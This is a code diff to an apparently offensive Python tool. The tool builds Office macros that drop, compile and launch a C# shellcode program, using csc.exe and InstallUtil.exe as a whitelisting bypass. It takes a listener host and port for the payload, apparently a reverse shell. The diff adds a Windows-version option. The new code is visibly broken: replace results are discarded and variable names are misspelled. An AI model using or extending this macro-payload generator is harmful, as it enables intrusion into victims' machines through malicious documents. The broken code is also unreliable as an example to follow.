@@ -13,11 +13,8 @@ onDiskFileBase = 'C:\\\\Users\\\\Public\\\\temp'
 onDiskFileName = onDiskFileBase + '.cs'
 onDiskExeName = onDiskFileBase + '.exe'
 
-x64Compile = 'C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v2.0.50727\\\\csc.exe /r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:x64 /out:'
-x86Compile = 'C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v2.0.50727\\\\csc.exe /r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:x86 /out:'
-x64InstallRun = 'C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v2.0.50727\\\\InstallUtil.exe /LogToConsole=false /U '
-x86InstallRun = 'C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v2.0.5.0727\\\\InstallUtil.exe /LogToConsole=false /U'
-
+WindowsVersion7 = 'v2.0.50727'
+WindowsVersion10 = 'v4.0.30319'
 
 def grabCSTemplate():
     response = urllib2.urlopen('https://raw.githubusercontent.com/fullmetalcache/tools/master/cspstemplate.cs')
@@ -37,7 +34,25 @@ def grabMacroTemplate():
 
     return macroTemp
 
-def createMacro(arch):
+def createMacro(arch, windows):
+    
+    CompileCmd = 'C:\\\\Windows\\\\Microsoft.NET\\\\FrameworkArch\\\\Version\\\\csc.exe /r:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /unsafe /platform:x64 /out:'
+    InstallUtilCmd = 'C:\\\\Windows\\\\Microsoft.NET\\\\FrameworkArch\\\\Version\\\\InstallUtil.exe /LogToConsole=false /U '
+    
+    if windows == '7':
+        CompileCmd.replace("Version", WindowsVersion7)
+        InstallUtilCmd.replace("Version", WindowVersion7)
+    elif windows == '10':
+        CompileCmd.replace("Version", WindowVersion10)
+        InstallUtilCmd.replace("Version", WindowVersion10)
+    
+    if arch == 'x64':
+        CompileCmd.replace("Arch", "64")
+        InstallUtilCmd.replace("Arch", "64")
+    elif arch == 'x86':
+        CompileCmd.replace("Arch", "")
+        InstallUtilCmd.replace("Arch", "")
+        
     macroTemp = grabMacroTemplate()
 
     macroLines = macroTemp.split('\n')
@@ -52,15 +67,9 @@ def createMacro(arch):
                 encodedChunked += "enc = enc & \""+ chunk + "\"\n"
             line = line.replace('$$$ENCODED$$$', encodedChunked)
         elif '$$$COMPILE$$$' in line:
-            if arch == 'x64':
-                line = line.replace('$$$COMPILE$$$', 'compCmd = \"' + x64Compile + onDiskExeName + " " + onDiskFileName + '\"')
-            else:
-               line = line.replace('$$$COMPILE$$$', 'compCmd = \"' + x86Compile + onDiskExeName + " " + onDiskFileName + '\"')
+            line = line.replace('$$$COMPILE$$$', 'compCmd = \"' + CompileCmd + onDiskExeName + " " + onDiskFileName + '\"')
         elif '$$$RUN$$$' in line:
-            if arch == 'x64':
-                line = line = line.replace('$$$RUN$$$', 'runCmd = \"' + x64InstallRun + onDiskExeName + '\"')
-            else:
-                line = line.replace('$$$RUN$$$', 'runCmd = \"' + x86InstallRun + onDiskExeName + '\"')
+            line = line = line.replace('$$$RUN$$$', 'runCmd = \"' + InstallUtilCmd + onDiskExeName + '\"')
         elif '$$$FILENAME$$$' in line:
             line = line.replace('$$$FILENAME$$$', 'fileName = \"' + onDiskFileName + '\"')
 
@@ -130,6 +139,7 @@ if __name__== "__main__":
     parser = argparse.ArgumentParser(description='Generate Office Macro that writes, compiles, and runs a C# shell code program')
 
     parser.add_argument('-a', '--arch', choices=['x86',  'x64'], required=True, help='Target Architecture')
+    parser.add_argument('-w', '--windows', choices=['7', '10'], required=True, help='Target Windows Version')
     parser.add_argument('-P', '--protocol', choices=['http', 'https', 'tcp'], required=True, help='Payload protocol')
     parser.add_argument('-l', '--lhost', required=True, help='Listener Host')
     parser.add_argument('-p', '--lport', required=True, help='Listener Port')
@@ -141,5 +151,5 @@ if __name__== "__main__":
     psScript = grabPSTemplate()
     createPsScript(psScript)
     injectShellcode( shellScript, args.normal )
-    createMacro(args.arch)
+    createMacro(args.arch, args.windows)
     #createShellCode
